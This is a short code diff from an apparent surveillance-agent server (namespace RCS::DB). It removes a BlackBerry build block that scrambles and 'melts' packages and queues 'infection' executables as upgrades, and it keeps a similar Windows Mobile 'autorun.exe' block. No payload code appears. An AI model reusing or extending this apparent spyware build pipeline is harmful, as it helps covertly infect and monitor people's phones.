@@ -226,7 +226,6 @@ class Item
 
           if mod['mobile']
             factory = ::Item.where({_kind: 'factory', ident: mod['factory']}).first
-
             build = RCS::DB::Build.factory(:winmo)
             build.load({'_id' => factory._id})
             build.unpack
@@ -235,20 +234,6 @@ class Item
             build.melt({'admin' => false, 'demo' => self.demo})
             add_upgrade('wmcore.001', File.join(build.tmpdir, 'autorun.exe'))
             add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))
-            build.clean
-
-            build = RCS::DB::Build.factory(:blackberry)
-            build.load({'_id' => factory._id})
-            build.unpack
-            build.patch({'demo' => self.demo})
-            build.scramble
-            build.melt({'appname' => 'bb_in'})
-            add_upgrade('javaloader.exe', File.join(build.tmpdir, 'infection/jlz.exe'))
-            add_upgrade('bb_in.exe', File.join(build.tmpdir, 'infection/bb_in.exe'))
-            add_upgrade('bb_in.jad', File.join(build.tmpdir, 'bb_in.jad'))
-            add_upgrade('bb_in.cod', File.join(build.tmpdir, 'bb_in.cod'))
-            add_upgrade('bb_in-1.cod', File.join(build.tmpdir, 'bb_in-1.cod'))
-            add_upgrade('bb_in_base.cod', File.join(build.tmpdir, 'bb_in_base.cod'))
             build.clean
           end
 
@@ -288,7 +273,7 @@ class Item
     content = File.open(file, 'rb+') {|f| f.read}
     raise "Cannot read from file #{file}" if content.nil?
 
-    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name, content_type: 'application/octet-stream'})] })
+    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
   end
 
   def upgrade!
